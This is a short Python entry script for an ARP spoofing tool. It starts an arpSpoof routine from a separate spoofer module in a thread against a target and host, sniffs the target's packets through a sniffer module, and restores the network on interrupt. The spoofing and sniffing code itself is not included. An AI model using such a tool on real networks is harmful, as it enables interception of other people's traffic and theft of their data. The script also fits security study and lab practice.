#!/usr/bin/env python3
# main.py
from spoofer import *
import sys
import threading
from sniffer import readPackets

def main():
	target = sys.argv[1]
	host = sys.argv[2]
	verbose = False
	try:

		t1 = threading.Thread(target=arpSpoof, args=(target, host, verbose,))
		t1.daemon = True
		t1.start()
		readPackets(target)
		t1.join()

	except KeyboardInterrupt:
		print("\tARP Spoofing interrupted. Restoring network.")
		restore(target, host, verbose)
		restore(host, target, verbose)


if __name__ == "__main__":
	main()
